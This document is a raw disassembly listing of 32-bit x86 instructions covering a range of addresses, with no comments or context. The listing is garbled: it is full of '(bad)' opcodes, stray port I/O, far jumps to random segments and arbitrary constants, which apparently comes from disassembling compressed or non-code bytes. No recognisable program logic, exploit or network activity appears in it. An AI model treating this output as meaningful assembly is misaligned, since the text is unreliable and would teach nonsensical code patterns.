  426435:	(bad)  
  426436:	xchg   esi,eax
  426437:	xchg   BYTE PTR ds:[ecx+0x65],dh
  42643b:	clc    
  42643c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42643d:	pop    esi
  42643e:	fidivr WORD PTR [edi+0x6735501d]
  426444:	shl    ecx,0xd5
  426447:	jno    0x4263cd
  426449:	inc    esp
  42644a:	out    dx,al
  42644b:	and    eax,DWORD PTR [esi]
  42644d:	mov    edi,0x86dcf626
  426452:	test   ebx,edx
  426454:	cmp    al,0x9e
  426456:	inc    esi
  426457:	test   DWORD PTR [esi+0x6c27334a],edx
  42645d:	xchg   ebp,eax
  42645e:	cdq    
  42645f:	je     0x4264d3
  426461:	adc    eax,DWORD PTR [esi]
  426463:	retf   0x5e66
  426466:	das    
  426467:	inc    ebp
  426468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426469:	sub    BYTE PTR [edx],bl
  42646b:	push   ebx
  42646c:	or     al,0x23
  42646e:	shr    edi,0xc6
  426471:	ficomp DWORD PTR [eax+0x21]
  426474:	jno    0x4264f2
  426476:	call   0x5919:0x5dc4c8db
  42647d:	dec    esp
  42647e:	xor    DWORD PTR [ebx-0xd],ebx
  426481:	or     ah,BYTE PTR [eax]
  426483:	mul    DWORD PTR [ebx+0x7ac66c7b]
  426489:	mov    al,ds:0x5677238b
  42648e:	mov    ecx,0xba0d61ae
  426493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426494:	es mov bl,0x1a
	...
  426513:	add    BYTE PTR [edi-0x126a5a8a],bh
  426519:	xlat   BYTE PTR ds:[ebx]
  42651a:	mov    edi,0xa0a36c7e
  42651f:	rol    BYTE PTR [edx+0x6c],0x14
  426523:	mov    ebp,0x1f6bb
  426528:	imul   eax,DWORD PTR [edi],0x0
  42652b:	add    BYTE PTR [esi-0x7171c2],ch
  426531:	or     ah,cl
  426533:	call   0xe6e2:0xb9fa060f
  42653a:	pusha  
  42653b:	ja     0x4264e2
  42653d:	in     al,dx
  42653e:	mov    ecx,0xa4c8f2c1
  426543:	add    eax,0xa9df9743
  426548:	jns    0x426592
  42654a:	pop    eax
  42654b:	push   ss
  42654c:	sbb    DWORD PTR [esi+ebp*2],edi
  42654f:	mov    ch,0x92
  426551:	mov    edx,ebp
  426553:	sub    edi,DWORD PTR [edi-0x67]
  426556:	aad    0x36
  426558:	int    0xc2
  42655a:	xor    BYTE PTR [ecx],cl
  42655c:	in     eax,0x71
  42655e:	mov    cl,0xbd
  426560:	or     BYTE PTR [ebp+esi*2-0x19],ch
  426564:	iret   
  426565:	mov    BYTE PTR [eax],dl
  426567:	jns    0x4265d5
  426569:	add    bh,cl
  42656b:	jmp    FWORD PTR [esi+0x52]
  42656e:	sbb    al,0xf7
  426570:	xchg   ebp,eax
  426571:	jno    0x4265d0
  426573:	ficom  DWORD PTR ds:0x41dd3e1f
  426579:	arpl   bp,di
  42657b:	or     al,0x1d
  42657d:	ins    DWORD PTR es:[edi],dx
  42657e:	pop    ss
  42657f:	dec    esp
  426580:	int3   
  426581:	in     al,0x56
  426583:	push   cs
  426584:	cmp    ecx,DWORD PTR [ebp-0xb833bfe]
  42658a:	test   dh,dh
  42658c:	int    0xfb
  42658e:	retf   
  42658f:	enter  0xcbcd,0xa3
  426593:	cmp    DWORD PTR [ebx+0x4444dbd8],0x69
  42659a:	outs   dx,BYTE PTR ds:[esi]
  42659b:	lods   eax,DWORD PTR ds:[esi]
  42659c:	sub    DWORD PTR [esi-0x8],0x13
  4265a0:	frstor es:[edx-0x79309a7e]
  4265a7:	pop    eax
  4265a8:	and    DWORD PTR [eax+edi*8-0x65],edi
  4265ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265ad:	(bad)  [edi]
  4265af:	dec    eax
  4265b0:	out    0x70,al
  4265b2:	mov    esp,esp
  4265b4:	jmp    0x41ff618e
  4265b9:	popa   
  4265ba:	adc    ch,BYTE PTR [edx-0x2a]
  4265bd:	adc    al,BYTE PTR [eax]
  4265bf:	push   edx
  4265c0:	mov    eax,ds:0xdaa81f10
  4265c5:	mov    ah,0x3d
  4265c7:	sub    BYTE PTR [ecx+0x53],ah
  4265ca:	es xor al,0x19
  4265cd:	push   esi
  4265ce:	mov    al,0x20
  4265d0:	rcr    BYTE PTR [ebp-0x6de47808],0xb
  4265d7:	mov    eax,ds:0xb6a52d14
  4265dc:	mov    esp,0xcebea7a6
  4265e1:	adc    DWORD PTR [ebx+edi*2-0x4f],eax
  4265e5:	cld    
  4265e6:	ss sti 
  4265e8:	(bad)  
  4265ea:	mov    al,0x14
  4265ec:	add    BYTE PTR [esi-0xb969b65],ah
  4265f2:	cmc    
  4265f3:	adc    BYTE PTR [ebx-0x46237333],bh
  4265f9:	jp     0x426642
  4265fb:	and    al,0x79
  4265fd:	pop    ecx
  4265fe:	cmp    ebx,0x1af2e85d
  426604:	in     al,dx
  426605:	popa   
  426606:	mov    eax,?
  426608:	out    dx,eax
  426609:	sub    BYTE PTR [edi],bl
  42660b:	inc    eax
  42660c:	jle    0x4265f9
  42660e:	loopne 0x426669
  426610:	mov    DWORD PTR [esi-0xe60bc19],eax
  426616:	data16 fbld TBYTE PTR [ebx-0x4]
  42661a:	outs   dx,BYTE PTR ds:[esi]
  42661b:	bnd je 0x4265ad
  42661e:	inc    eax
  42661f:	(bad)  
  426620:	scas   eax,DWORD PTR es:[edi]
  426621:	sbb    ah,BYTE PTR [esi+0x39]
  426624:	jno    0x4265da
  426626:	dec    ebx
  426627:	mov    al,ds:0x36c98798
  42662c:	mov    al,ds:0x676fd6bf
  426631:	jmp    0x86859271
  426636:	push   eax
  426637:	fldenv [edx-0x34c08a79]
  42663d:	popf   
  42663e:	inc    eax
  42663f:	fsubr  st,st(6)
  426641:	inc    esi
  426642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426643:	mov    fs,WORD PTR [ebp+0x7c]
  426646:	pop    ss
  426647:	in     eax,0x2d
  426649:	cs xchg edi,eax
  42664b:	mov    bl,0xa4
  42664d:	stos   DWORD PTR es:[edi],eax
  42664e:	xchg   ebp,eax
  42664f:	add    eax,0xbb18d0df
  426654:	leave  
  426655:	push   edi
  426656:	scas   al,BYTE PTR es:[edi]
  426657:	xor    edx,esp
  426659:	push   esi
  42665a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42665b:	push   eax
  42665c:	in     eax,dx
  42665d:	jns    0x426664
  42665f:	fs ins DWORD PTR es:[edi],dx
  426661:	(bad)  
  426662:	jb     0x4265ea
  426664:	retf   
  426665:	pop    ecx
  426666:	xchg   ebx,eax
  426667:	or     DWORD PTR [ebp+0x4a],esp
  42666a:	mov    esi,0x20cb1b20
  42666f:	jecxz  0x426635
  426671:	shl    BYTE PTR ss:[esi-0x2242ddae],cl
  426678:	jl     0x426674
  42667a:	push   eax
  42667b:	inc    edi
  42667c:	adc    ah,dh
  42667e:	in     eax,dx
  42667f:	aas    
  426680:	sbb    BYTE PTR [edx+edi*4-0xd],ah
  426684:	test   al,0xfc
  426686:	cdq    
  426687:	sbb    eax,0xfde895eb
  42668c:	dec    ebp
  42668d:	mov    edi,0xef225567
  426692:	pushf  
  426693:	pushf  
  426694:	cmp    bh,BYTE PTR [ebp+0x4f]
  426697:	sub    ecx,ebp
  426699:	rcr    BYTE PTR [edi],0x27
  42669c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42669d:	js     0x4266bc
  42669f:	icebp  
  4266a0:	jae    0x4266d0
  4266a2:	xchg   BYTE PTR [edx],ah
  4266a4:	mov    ds:0xe6e2dcd9,eax
  4266a9:	lds    ecx,FWORD PTR [ecx+0x56]
  4266ac:	ror    DWORD PTR [eax],1
  4266ae:	pushf  
  4266af:	ins    DWORD PTR es:[edi],dx
  4266b0:	push   ebp
  4266b1:	mov    DWORD PTR [edi],eax
  4266b3:	enter  0xc990,0x50
  4266b7:	mov    eax,0x81041532
  4266bc:	adc    al,0x1c
  4266be:	rcl    BYTE PTR [ecx+0x1a],0x4
  4266c2:	pop    esp
  4266c3:	pop    edx
  4266c4:	mov    al,0x4c
  4266c6:	sbb    dl,ch
  4266c8:	push   ebp
  4266c9:	enter  0x8700,0xba
  4266cd:	pop    edi
  4266ce:	and    esp,eax
  4266d0:	sub    eax,0x851089e2
  4266d5:	mov    DWORD PTR [esi+0x6a4165d2],esp
  4266db:	dec    esp
  4266dc:	out    0x66,eax
  4266de:	mov    ss,WORD PTR [edx-0x6459000c]
  4266e4:	clc    
  4266e5:	fdivr  st(5),st
  4266e7:	push   ds
  4266e8:	mov    DWORD PTR [ebx+ebx*8+0x3cc14441],edi
  4266ef:	add    esi,DWORD PTR [ebp+0x553855bb]
  4266f5:	xor    dl,al
  4266f7:	test   DWORD PTR [ecx+esi*4],edx
  4266fa:	fucomip st,st(4)
  4266fc:	mov    ebp,0x2dc37186
  426701:	mov    esp,0x259f0201
  426706:	pop    ebp
  426707:	or     al,BYTE PTR [esi+ebx*4]
  42670a:	cmp    al,0xcf
  42670c:	bnd jb 0x42671b
  42670f:	jne    0x4266f2
  426711:	inc    ecx
  426712:	sbb    esp,ebp
  426714:	dec    ebp
  426715:	out    dx,al
  426716:	push   ecx
  426717:	dec    esp
  426718:	jno    0x426733
  42671a:	dec    edx
  42671b:	out    dx,al
  42671c:	call   FWORD PTR [eax+0x2]
  42671f:	dec    eax
  426720:	outs   dx,DWORD PTR ds:[esi]
  426721:	mov    BYTE PTR [esi-0x62],al
  426724:	test   DWORD PTR [esi-0x54eb99ef],ebx
  42672a:	xchg   edx,eax
  42672b:	jl     0x4266f6
  42672d:	div    edi
  42672f:	enter  0x7a16,0x1f
  426733:	or     ch,cl
  426735:	repz test BYTE PTR [eax+ecx*8-0x4a2351f0],ah
  42673d:	xor    eax,0xf540019c
  426742:	js     0x426775
  426744:	mov    dl,BYTE PTR [ebp-0x44]
  426747:	fmul   DWORD PTR [eax+0x16da9d0]
  42674d:	sub    ebx,0xffffffc0
  426750:	jg     0x426783
  426752:	push   esp
  426753:	gs scas eax,DWORD PTR es:[edi]
  426755:	inc    ebp
  426756:	pop    ds
  426757:	jo     0x426700
  426759:	pop    ds
  42675a:	sbb    ebx,DWORD PTR [edx+ecx*1+0x432f43e8]
  426761:	xor    eax,0x90fc766e
  426766:	push   es
  426767:	les    edi,FWORD PTR [edx-0x39]
  42676a:	ficomp WORD PTR ds:0xaecdda01
  426770:	sbb    ah,cl
  426772:	add    al,0xb3
  426774:	add    DWORD PTR [edi-0x3042a95],edi
  42677a:	mov    ds:0x6bc6d482,al
  42677f:	shl    DWORD PTR [edx],1
  426781:	cmp    al,0xe1
  426783:	and    dl,bl
  426785:	shl    BYTE PTR gs:[eax],1
  426788:	jae    0x426797
  42678a:	xchg   esp,eax
  42678b:	imul   edi,DWORD PTR [edi+0x4c7fd88a],0xffffffe0
  426792:	in     al,0x7f
  426794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426795:	les    esp,FWORD PTR [edx-0x4766eab8]
  42679b:	imul   ecx,DWORD PTR [esi],0x1d5fbf5a
  4267a1:	out    dx,eax
  4267a2:	add    al,0xa5
  4267a4:	es cli 
  4267a6:	aaa    
  4267a7:	retf   
  4267a8:	daa    
  4267a9:	jnp    0x426781
  4267ab:	ins    BYTE PTR es:[edi],dx
  4267ac:	xchg   esi,eax
  4267ad:	lea    ebp,[eax-0x8]
  4267b0:	dec    ecx
  4267b1:	jb     0x42678a
  4267b3:	fdivrp st(7),st
  4267b5:	cmp    ah,BYTE PTR [edi-0x6d]
  4267b8:	je     0x42675c
  4267ba:	pop    ds
  4267bb:	fwait
  4267bc:	sub    al,0xce
  4267be:	or     BYTE PTR [bp+si+0x28a7],bl
  4267c3:	cmp    eax,edi
  4267c5:	xchg   ecx,eax
  4267c6:	leave  
  4267c7:	pop    eax
  4267c8:	inc    esi
  4267c9:	push   ebx
  4267ca:	jg     0x4267f7
  4267cc:	xchg   edx,eax
  4267cd:	lods   al,BYTE PTR ds:[esi]
  4267ce:	ret    
  4267cf:	jmp    0xa0f:0x71acf96
  4267d6:	adc    al,0x6f
  4267d8:	retf   
  4267d9:	ins    BYTE PTR es:[edi],dx
  4267da:	add    edx,eax
  4267dc:	leave  
  4267dd:	ins    DWORD PTR es:[edi],dx
  4267de:	in     al,0xe4
  4267e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267e1:	js     0x426842
  4267e3:	pop    eax
  4267e4:	cvtpi2ps xmm1,QWORD PTR [esi+0x6c6680f9]
  4267eb:	iret   
  4267ec:	adc    ecx,esi
  4267ee:	cmp    esp,ebp
  4267f0:	sub    eax,0xd1a11c28
  4267f5:	dec    esp
  4267f6:	stos   BYTE PTR es:[edi],al
  4267f7:	and    BYTE PTR [edx],ch
  4267f9:	ror    eax,1
  4267fb:	push   edx
  4267fc:	jmp    0x42684a
  4267fe:	test   DWORD PTR [edx+0x691b7b0],ecx
  426804:	mov    bl,BYTE PTR [edx+ebp*8]
  426807:	nop
  426808:	cmp    edi,DWORD PTR [edi+edx*1+0x2b]
  42680c:	push   eax
  42680d:	jl     0x42685f
  42680f:	adc    DWORD PTR [ebp+0x30c4d235],esp
  426815:	pop    esi
  426816:	and    esi,DWORD PTR [eax]
  426818:	repnz (bad)
  42681b:	jl     0x426811
  42681d:	jg     0x42681b
  42681f:	mov    ah,0x7d
  426821:	xor    DWORD PTR [eax],esi
  426823:	xchg   ecx,eax
  426824:	idiv   DWORD PTR [edi+edi*1]
  426827:	fs and bh,BYTE PTR cs:[ebx]
  42682b:	push   esp
  42682c:	data16 rol BYTE PTR [edx],cl
  42682f:	rol    DWORD PTR [eax+edx*1-0x14ac1d53],cl
  426836:	and    ebp,DWORD PTR [esi]
  426838:	sti    
  426839:	mov    dl,0xaa
  42683b:	enter  0x1825,0xdc
  42683f:	imul   edx,DWORD PTR [eax+0x4],0x23b39ea2
  426846:	rcr    DWORD PTR [esi-0x71],0xd3
  42684a:	aad    0xaf
  42684c:	scas   al,BYTE PTR es:[edi]
  42684d:	out    dx,eax
  42684e:	(bad)  
  42684f:	jp     0x426846
  426851:	stc    
  426852:	push   esp
  426853:	out    dx,al
  426854:	cmp    eax,0x6a9fc8fc
  426859:	fst    QWORD PTR [esi-0x27]
  42685c:	hlt    
  42685d:	pop    esi
  42685e:	orps   xmm4,XMMWORD PTR [edi-0x31]
  426862:	shr    ch,0x6f
  426865:	adc    edx,ebp
  426867:	sbb    DWORD PTR [eax],edx
  426869:	mov    edi,0x41be16a8
  42686e:	aad    0x35
  426870:	(bad)  
  426871:	jno    0x4268df
  426873:	sub    bl,BYTE PTR [ecx+0x4a24ce40]
  426879:	jae    0x4268d4
  42687b:	sub    eax,0x2153db76
  426880:	aas    
  426881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426882:	jmp    0xbc53:0x74b0bce1
  426889:	(bad)
  42688c:	adc    DWORD PTR [esi-0x61],ebp
  42688f:	loopne 0x42687d
  426891:	mov    cl,0x43
  426893:	push   ebp
  426894:	cmp    edx,DWORD PTR [ebx]
  426896:	jmp    0xfc23982d
  42689b:	in     al,0x7a
  42689d:	mov    ds:0xad024a55,al
  4268a2:	retf   0x32d6
  4268a5:	push   es
  4268a6:	data16 ja 0x42683b
  4268a9:	rcl    BYTE PTR ds:0x3fb32513,0x10
  4268b0:	(bad)  
  4268b1:	xchg   DWORD PTR [ecx-0x15],ecx
  4268b4:	jmp    0x426872
  4268b6:	fwait
  4268b7:	out    dx,eax
  4268b8:	mov    al,0x48
  4268ba:	dec    edx
  4268bb:	repz dec esi
  4268bd:	jae    0x4268a6
  4268bf:	(bad)
  4268c3:	inc    esi
  4268c4:	cld    
  4268c5:	mov    edx,0x5d285ffc
  4268ca:	pusha  
  4268cb:	outs   dx,BYTE PTR ds:[esi]
  4268cc:	int    0xab
  4268ce:	(bad)  
  4268d0:	cmc    
  4268d1:	hlt    
  4268d2:	ret    
  4268d3:	rcl    edi,0xe9
  4268d6:	push   eax
  4268d7:	mov    ebx,0x5d7cff1d
  4268dc:	rcl    cl,cl
  4268de:	jb     0x426909
  4268e0:	mov    al,0xec
  4268e2:	in     eax,0x24
  4268e4:	xchg   edi,eax
  4268e5:	pop    esp
  4268e6:	sahf   
  4268e7:	add    DWORD PTR [eax],0xb72842e
  4268ed:	ds or  cl,ch
  4268f0:	adc    BYTE PTR [ebp+0x7d],cl
  4268f3:	mov    bh,0x73
  4268f5:	aaa    
  4268f6:	mov    esp,0xb198865b
  4268fb:	lea    ebx,[edi-0x55]
  4268fe:	aas    
  4268ff:	jp     0x4268e5
  426901:	imul   ebx,DWORD PTR [ecx],0x7d
  426904:	inc    esp
  426905:	popf   
  426906:	lds    esp,FWORD PTR [edi-0x37]
  426909:	mov    es,WORD PTR [edi-0x3efa81e2]
  42690f:	pop    ecx
  426910:	in     al,dx
  426911:	xor    esp,DWORD PTR [ecx+0x65]
  426914:	cs (bad) 
  426916:	data16 fstp DWORD PTR [edx+0x1f]
  42691a:	pop    ebp
  42691b:	addr16 loope 0x42689e
  42691e:	imul   edi,edi,0xffffffb6
  426921:	shl    DWORD PTR [ebx+ecx*4+0x3c],1
  426925:	(bad)  
  426926:	loope  0x426956
  426928:	adc    cl,ah
  42692a:	aam    0xc7
  42692c:	pop    es
  42692d:	pusha  
  42692e:	jb     0x426944
  426930:	jmp    0x96a5fc48
  426935:	mov    eax,ds:0x3960cbfd
  42693a:	inc    esi
  42693b:	popa   
  42693c:	stc    
  42693d:	mov    ecx,0x24c65527
  426942:	lahf   
  426943:	mov    ecx,0x2f0054e4
  426948:	mov    ds:0x88f7fcda,eax
  42694d:	pop    ds
  42694e:	sub    eax,0x77462570
  426953:	cmp    DWORD PTR [edx-0x62dd7e5c],ecx
  426959:	lds    esi,FWORD PTR [edx-0x1a]
  42695c:	add    eax,0xb08e5481
  426961:	push   esp
  426962:	jb     0x4268ec
  426964:	fcmove st,st(2)
  426966:	out    0x48,eax
  426968:	test   DWORD PTR [ebp-0x7adaa4cf],ecx
  42696e:	xor    eax,0x68e18263
  426973:	aaa    
  426974:	push   edi
  426975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426976:	stc    
  426977:	sbb    ah,BYTE PTR [edi-0x7040d52a]
  42697d:	push   ebp
  42697e:	bound  eax,QWORD PTR [ebp-0x2c90e0ba]
  426984:	xchg   esp,eax
  426985:	or     edi,DWORD PTR [ebp-0x2bb71b87]
  42698b:	push   edx
  42698c:	pushf  
  42698d:	push   edx
  42698e:	dec    ebx
  42698f:	mov    DWORD PTR [eax-0x38],esi
  426992:	adc    BYTE PTR [ebx-0x1b],dl
  426995:	lods   eax,DWORD PTR ds:[esi]
  426996:	sti    
  426997:	aaa    
  426998:	jb     0x426994
  42699a:	daa    
  42699b:	push   es
  42699c:	inc    ebx
  42699d:	test   BYTE PTR [eax-0x52d9301a],bh
  4269a3:	xchg   edx,eax
  4269a4:	adc    eax,0xbaca2927
  4269a9:	and    BYTE PTR [ebx-0x2c365116],dh
  4269af:	pop    es
  4269b0:	add    bl,BYTE PTR [ebx-0x6e839e3d]
  4269b6:	jmp    0xf5e2301c
  4269bb:	xchg   ebp,eax
  4269bc:	in     al,dx
  4269bd:	hlt    
  4269be:	mov    esp,0x82fae333
  4269c3:	xchg   edi,eax
  4269c4:	stos   DWORD PTR es:[edi],eax
  4269c5:	(bad)  [ebp-0x42afe7b1]
  4269cb:	mov    ds:0x51eaaa79,al
  4269d0:	mov    edi,0x101c5657
  4269d5:	test   al,0x2b
  4269d7:	fidiv  DWORD PTR [edi-0x5be74572]
  4269dd:	cld    
  4269de:	in     eax,0xb
  4269e0:	je     0x426a02
  4269e2:	jo     0x426a3d
  4269e4:	fucomi st,st(2)
  4269e6:	fwait
  4269e7:	cmp    bl,ch
  4269e9:	fs cwde 
  4269eb:	xchg   BYTE PTR [edx-0x56],cl
  4269ee:	jp     0x4269b6
  4269f0:	popf   
  4269f1:	sar    dh,1
  4269f3:	data16 fs jnp 0x426a60
  4269f7:	inc    edi
  4269f8:	dec    ebp
  4269f9:	cmc    
  4269fa:	add    eax,0x871dd801
  4269ff:	adc    eax,0xb8574fa
  426a04:	shl    BYTE PTR [edx],cl
  426a06:	mul    eax
  426a08:	sbb    eax,DWORD PTR [ebx]
  426a0a:	inc    esi
  426a0b:	inc    esp
  426a0c:	inc    eax
  426a0d:	mov    eax,0xf829113c
  426a12:	pop    eax
  426a13:	cmp    BYTE PTR [ecx+0x5a],ah
  426a16:	jbe    0x426a7b
  426a18:	push   ds
  426a19:	repnz (bad) [ebx+0x6]
  426a1d:	(bad)  
  426a1f:	aad    0x9c
  426a21:	sub    DWORD PTR [ebp-0x72ae0abf],esp
  426a27:	ins    BYTE PTR es:[edi],dx
  426a28:	ds inc edx
  426a2a:	xchg   ebp,eax
  426a2b:	retf   
  426a2c:	cwde   
  426a2d:	sub    bh,BYTE PTR [eax-0x36d7db36]
  426a33:	jmp    0x426aa9
  426a35:	rcr    BYTE PTR [edx-0x7201031],cl
  426a3b:	xchg   edx,eax
  426a3c:	dec    ebp
  426a3d:	push   cs
  426a3e:	cmc    
  426a3f:	or     bl,BYTE PTR [ecx+ebp*8+0x69427542]
  426a46:	mov    bl,0x73
  426a48:	and    eax,0xa2bccd2f
  426a4d:	jg     0x4269f9
  426a4f:	jno    0x426aa2
  426a51:	xor    eax,0xc8da4a35
  426a56:	mov    ebp,0xffd07c4f
  426a5b:	mov    WORD PTR [eax+0x30bd0cbb],fs
  426a61:	lea    edi,[esi]
  426a63:	call   0xa410:0x89b04436
  426a6a:	add    al,ch
  426a6c:	std    
  426a6d:	xor    al,0x74
  426a6f:	mov    es,WORD PTR [ebp-0x2f8203de]
  426a75:	retf   0xaeba
  426a78:	mov    ebp,0x7f57cc47
  426a7d:	ja     0x426aac
  426a7f:	mov    al,ds:0x8f727c62
  426a84:	inc    ecx
  426a85:	lods   eax,DWORD PTR ds:[esi]
  426a86:	jmp    0xd0b4:0x6094a22
  426a8d:	ins    DWORD PTR es:[edi],dx
  426a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a8f:	jbe    0x426ada
  426a91:	test   DWORD PTR [esi-0x612aa9e4],edx
  426a97:	pop    ecx
  426a98:	icebp  
  426a99:	rol    DWORD PTR [edx],1
  426a9b:	mov    eax,0x75725078
  426aa0:	ret    
  426aa1:	pop    ss
  426aa2:	call   0x56737a0f
  426aa7:	pop    ebp
  426aa8:	and    ebx,eax
  426aaa:	les    edx,FWORD PTR [ecx-0x3d]
  426aad:	xor    eax,0xabe0123d
  426ab2:	in     al,0x5b
  426ab4:	lds    eax,FWORD PTR [edi+ebx*2]
  426ab7:	mov    WORD PTR ds:0x4c353f5,ss
  426abd:	sbb    DWORD PTR [edx+0x57],eax
  426ac0:	test   WORD PTR [ecx-0x6a12a6bd],cx
  426ac7:	test   al,0xe4
  426ac9:	gs jns 0x426b01
  426acc:	mov    bh,0xda
  426ace:	popf   
  426acf:	loopne 0x426ad9
  426ad1:	shr    DWORD PTR [ebx],1
  426ad3:	xor    edi,DWORD PTR [edx+eiz*8-0x5f391a56]
  426ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426adb:	pop    esp
  426adc:	cmp    BYTE PTR [edi+0x16],al
  426adf:	cmp    BYTE PTR [eax],cl
  426ae1:	sub    DWORD PTR [edx+0x64],eax
  426ae4:	ds retf 
  426ae6:	push   ss
  426ae7:	xor    al,0x2f
  426ae9:	xchg   edx,eax
  426aea:	aam    0xef
  426aec:	lahf   
  426aed:	pop    ds
  426aee:	fwait
  426aef:	popf   
  426af0:	xor    BYTE PTR [edx+0x6d5c66c1],bl
  426af6:	jae    0x426af6
  426af8:	mov    esp,0x49bb2697
  426afd:	lock mov ecx,0x85e4ad8f
  426b03:	push   ecx
  426b04:	outs   dx,BYTE PTR ds:[esi]
  426b05:	xchg   edx,eax
  426b06:	mov    ds:0x4c0c20,eax
  426b0b:	fstp   QWORD PTR [edx-0x44]
  426b0e:	push   ss
  426b0f:	ret    0x748c
  426b12:	mov    esi,0x4a1e290e
  426b17:	mov    ds:0x4dd8fb7,eax
  426b1c:	mov    ah,0x64
  426b1e:	mov    esp,0x65b87e7f
  426b23:	scas   al,BYTE PTR es:[edi]
  426b24:	push   ebp
  426b25:	dec    edx
  426b26:	xor    al,0xa2
  426b28:	cdq    
  426b29:	out    0xae,al
  426b2b:	sbb    DWORD PTR [edi],ebp
  426b2d:	dec    edx
  426b2e:	arpl   WORD PTR [esi-0x55],bp
  426b31:	inc    ebx
  426b32:	lods   al,BYTE PTR ds:[esi]
  426b33:	or     eax,0x83e9e8b8
  426b38:	repz cld 
  426b3a:	repz clc 
  426b3c:	and    BYTE PTR [edx+0x1d],0xe2
  426b40:	and    cl,BYTE PTR [ebp+0x57]
  426b43:	pusha  
  426b44:	imul   BYTE PTR [edx+0x6edcd190]
  426b4a:	xchg   edx,eax
  426b4b:	fld    TBYTE PTR [edx-0x2ba2adbc]
  426b51:	mov    ch,BYTE PTR [edi-0x4]
  426b54:	sbb    eax,DWORD PTR [ecx+eiz*2-0x77]
  426b58:	push   edx
  426b59:	stos   DWORD PTR es:[edi],eax
  426b5a:	xchg   DWORD PTR [edi],esi
  426b5c:	inc    ecx
  426b5d:	test   al,0x5f
  426b5f:	mov    bl,0x7e
  426b61:	retf   0x325b
  426b64:	scas   al,BYTE PTR es:[edi]
  426b65:	scas   al,BYTE PTR es:[edi]
  426b66:	dec    esp
  426b67:	psrlw  mm7,QWORD PTR [edx]
  426b6a:	mov    al,ds:0x1bc1f398
  426b6f:	ja     0x426b3c
  426b71:	xor    edi,edi
  426b73:	jne    0x426baf
  426b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b76:	pop    ebx
  426b77:	pop    edi
  426b78:	mov    eax,ds:0xfe9d2f55
  426b7d:	mov    cl,0x19
  426b7f:	pop    ss
  426b80:	adc    cl,BYTE PTR [edx-0x5b0cddae]
  426b86:	pop    edx
  426b87:	or     dh,BYTE PTR [ecx-0x4]
  426b8a:	mov    ecx,0xbc0390ff
  426b8f:	in     eax,dx
  426b90:	jae    0x426be6
  426b92:	mov    al,ds:0x1dc76ca6
  426b97:	inc    eax
  426b98:	stc    
  426b99:	je     0x426b85
  426b9b:	arpl   WORD PTR cs:[esi+0x50],sp
  426b9f:	retf   0xbc14
  426ba2:	and    BYTE PTR [esi+0x9048237],dl
  426ba8:	or     ah,BYTE PTR gs:[edx+0x62]
  426bac:	fdivr  DWORD PTR [eax+edi*1-0x77]
  426bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bb1:	inc    eax
  426bb2:	rol    BYTE PTR [edi],1
  426bb4:	lds    ebx,FWORD PTR [esi-0x5e819501]
  426bba:	test   BYTE PTR [eax],al
  426bbc:	or     al,0x49
  426bbe:	dec    edx
  426bbf:	in     eax,0xb8
  426bc1:	add    dl,bh
  426bc3:	push   ds
  426bc4:	mov    edx,0xa8ec124
  426bc9:	jle    0x426bf3
  426bcb:	push   es
  426bcc:	addr16 push ebp
  426bce:	outs   dx,BYTE PTR ds:[esi]
  426bcf:	add    DWORD PTR [edx+0x30],esp
  426bd2:	add    cl,BYTE PTR [esi+eax*2]
  426bd5:	rcl    dh,cl
  426bd7:	int3   
  426bd8:	xor    ch,BYTE PTR [ecx+0x756b75d5]
  426bde:	test   ah,cl
  426be0:	sub    DWORD PTR [ecx+0x5533f821],eax
  426be6:	mov    bh,0xb2
  426be8:	mov    ds:0x32ac9123,al
  426bed:	xchg   esi,eax
  426bee:	mov    al,al
  426bf0:	pop    edi
  426bf1:	push   esi
  426bf2:	ja     0x426c31
  426bf4:	in     eax,0xc7
  426bf6:	mov    bh,0xa7
  426bf8:	lahf   
  426bf9:	adc    DWORD PTR [edi+0x778de89c],esi
  426bff:	leave  
  426c00:	imul   eax,DWORD PTR [eax+0x65ca21d2],0x823be7fe
  426c0a:	add    BYTE PTR [ebx-0x31],ah
  426c0d:	mov    ecx,0xf82e5cea
  426c12:	loop   0x426c04
  426c14:	push   ss
  426c15:	(bad)
  426c18:	jmp    0x38a723b8
  426c1d:	inc    ebp
  426c1e:	stos   BYTE PTR es:[edi],al
  426c1f:	ins    DWORD PTR es:[edi],dx
  426c20:	pushf  
  426c21:	test   al,0x25
  426c23:	pop    edx
  426c24:	stos   BYTE PTR es:[edi],al
  426c25:	inc    ebx
  426c26:	bound  ebp,QWORD PTR [ecx-0x569a5980]
  426c2c:	mov    ch,0xcd
  426c2e:	and    BYTE PTR [ebx],dl
  426c30:	outs   dx,DWORD PTR ds:[esi]
  426c31:	ja     0x426c50
  426c33:	or     eax,0xee9b70fa
  426c38:	xchg   esp,eax
  426c39:	lds    ecx,FWORD PTR [ecx-0x78]
  426c3c:	in     al,0x3
  426c3e:	add    cl,BYTE PTR [edi+0x37]
  426c41:	mov    ah,ch
  426c43:	cmp    al,BYTE PTR [eax]
  426c45:	sub    al,0xdb
  426c47:	jbe    0x426c7d
  426c49:	addr16 shl ch,cl
  426c4c:	fisub  DWORD PTR [eax+0x525e63e5]
  426c52:	dec    ebp
  426c53:	rol    BYTE PTR [edi],1
  426c55:	and    eax,0xd1cf30bf
  426c5a:	fnstsw WORD PTR [bp+si+0x78]
  426c5e:	xchg   esi,eax
  426c5f:	add    eax,0x641656a1
  426c64:	ja     0x426bff
  426c66:	fcomp  QWORD PTR [eax+0x4bfedf77]
  426c6c:	les    edx,FWORD PTR [esp+edx*2]
  426c6f:	add    BYTE PTR [ecx-0x170217a1],ch
  426c75:	les    eax,FWORD PTR [ebx+0xe9bcaf5]
  426c7b:	push   esi
